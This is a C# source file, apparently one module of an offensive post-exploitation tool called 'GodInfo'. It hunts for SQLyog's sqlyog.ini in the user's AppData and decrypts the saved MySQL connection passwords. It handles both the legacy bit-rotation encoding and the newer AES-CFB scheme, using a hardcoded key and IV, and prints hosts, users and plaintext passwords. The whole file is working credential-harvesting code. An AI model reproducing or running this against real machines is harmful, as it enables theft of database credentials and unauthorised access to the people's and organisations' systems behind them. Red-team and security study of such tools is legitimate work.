using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using GodInfo.Utils;

namespace GodInfo.Commands
{
    public class SQLyogCredCommand : ICommand
    {
        public struct ConnectionInfo
        {
            public string SectionName;
            public string Name;
            public string Host;
            public string Port;
            public string UserName;
            public string Password;
            public string Database;
            public string IsEncrypted;
        }

        private static readonly byte[] keyArray = { 0x29, 0x23, 0xBE, 0x84, 0xE1, 0x6C, 0xD6, 0xAE, 0x52, 0x90, 0x49, 0xF1, 0xC9, 0xBB, 0x21, 0x8F };
        private static readonly byte[] ivArray = { 0xB3, 0xA6, 0xDB, 0x3C, 0x87, 0x0C, 0x3E, 0x99, 0x24, 0x5E, 0x0D, 0x1C, 0x06, 0xB7, 0x47, 0xDE };

        private const string SQLyogIniPath = "SQLyog\\sqlyog.ini";

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting passwords saved by SQLyog.");
            GetSQLyogCred();
        }

        public static void GetSQLyogCred()
        {
            Logger.TaskHeader("Hunting SQLyog", 1);
            
            if (!CheckSQLyogCredExists())
            {
                Logger.WriteLine("[-] No SQLyog installation or saved connections found.");
                return;
            }

            // 从配置文件获取SQLyog凭据
            GetCredentialsFromIniFile();
        }

        public static bool CheckSQLyogCredExists()
        {
            string iniPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SQLyogIniPath);
            return File.Exists(iniPath);
        }

        private static void GetCredentialsFromIniFile()
        {
            try
            {
                string iniPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), SQLyogIniPath);
                Logger.WriteLine($"[+] Found SQLyog config file: {iniPath}");

                string iniContent = File.ReadAllText(iniPath);
                List<ConnectionInfo> connections = ParseIniContent(iniContent);

                if (connections.Count > 0)
                {
                    Logger.WriteLine($"\n[+] Found {connections.Count} SQLyog connection(s):");
                    Logger.PrintTableFromStructs(connections);
                }
                else
                {
                    Logger.WriteLine("[-] No saved SQLyog credentials found.");
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error reading SQLyog config file: {ex.Message}");
            }
        }

        private static List<ConnectionInfo> ParseIniContent(string iniContent)
        {
            List<ConnectionInfo> connections = new List<ConnectionInfo>();
            Dictionary<string, Dictionary<string, string>> sections = ParseIni(iniContent);

            foreach (var section in sections)
            {
                if (section.Key.Equals("default", StringComparison.OrdinalIgnoreCase) || 
                    !section.Value.ContainsKey("Password"))
                {
                    continue;
                }

                try
                {
                    string host = section.Value.TryGetValue("Host", out string hostValue) ? hostValue : string.Empty;
                    string port = section.Value.TryGetValue("Port", out string portValue) ? portValue : "3306";
                    string user = section.Value.TryGetValue("User", out string userValue) ? userValue : string.Empty;
                    string database = section.Value.TryGetValue("Database", out string dbValue) ? dbValue : string.Empty;
                    string name = section.Value.TryGetValue("Name", out string nameValue) ? nameValue : section.Key;
                    string encryptedPassword = section.Value["Password"];
                    bool isEncrypted = section.Value.TryGetValue("Isencrypted", out string encValue) && encValue == "1";

                    string password = isEncrypted 
                        ? NewDecrypt(encryptedPassword) 
                        : OldDecrypt(encryptedPassword);

                    connections.Add(new ConnectionInfo
                    {
                        SectionName = section.Key,
                        Name = name,
                        Host = host,
                        Port = port,
                        UserName = user,
                        Password = password,
                        Database = database,
                        IsEncrypted = isEncrypted ? "Yes" : "No"
                    });
                }
                catch (Exception ex)
                {
                    Logger.WriteLine($"[-] Error processing SQLyog connection '{section.Key}': {ex.Message}");
                }
            }

            return connections;
        }

        private static Dictionary<string, Dictionary<string, string>> ParseIni(string iniContent)
        {
            var result = new Dictionary<string, Dictionary<string, string>>(StringComparer.OrdinalIgnoreCase);
            string currentSection = "default";
            result[currentSection] = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

            foreach (var line in iniContent.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
            {
                string trimmedLine = line.Trim();
                
                // 跳过注释和空行
                if (string.IsNullOrWhiteSpace(trimmedLine) || trimmedLine.StartsWith(";"))
                {
                    continue;
                }

                // 新的节
                if (trimmedLine.StartsWith("[") && trimmedLine.EndsWith("]"))
                {
                    currentSection = trimmedLine.Substring(1, trimmedLine.Length - 2);
                    if (!result.ContainsKey(currentSection))
                    {
                        result[currentSection] = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                    }
                    continue;
                }

                // 键值对
                int equalsPos = trimmedLine.IndexOf('=');
                if (equalsPos > 0)
                {
                    string key = trimmedLine.Substring(0, equalsPos).Trim();
                    string value = trimmedLine.Substring(equalsPos + 1).Trim();

                    // 处理引号
                    if ((value.StartsWith("\"") && value.EndsWith("\"")) || 
                        (value.StartsWith("'") && value.EndsWith("'")))
                    {
                        value = value.Substring(1, value.Length - 2);
                    }

                    result[currentSection][key] = value;
                }
            }

            return result;
        }

        private static string OldDecrypt(string text)
        {
            try
            {
                byte[] bytes = Convert.FromBase64String(text);
                for (int i = 0; i < bytes.Length; i++)
                {
                    bytes[i] = ((byte)(((bytes[i]) << (1)) | ((bytes[i]) >> (8 - (1)))));
                }
                return Encoding.UTF8.GetString(bytes);
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error decrypting SQLyog password (old method): {ex.Message}");
                return "[解密失败]";
            }
        }

        private static string NewDecrypt(string text)
        {
            try
            {
                byte[] bytes = Convert.FromBase64String(text);
                byte[] bytespad = new byte[128];
                Array.Copy(bytes, bytespad, bytes.Length);
                
                using (RijndaelManaged rDel = new RijndaelManaged())
                {
                    rDel.Key = keyArray;
                    rDel.IV = ivArray;
                    rDel.BlockSize = 128;
                    rDel.Mode = CipherMode.CFB;
                    rDel.Padding = PaddingMode.None;
                    
                    using (ICryptoTransform cTransform = rDel.CreateDecryptor())
                    {
                        byte[] resultArray = cTransform.TransformFinalBlock(bytespad, 0, bytespad.Length)
                            .Take(bytes.Length).ToArray();
                        return Encoding.UTF8.GetString(resultArray);
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error decrypting SQLyog password (new method): {ex.Message}");
                return "[解密失败]";
            }
        }
    }
} 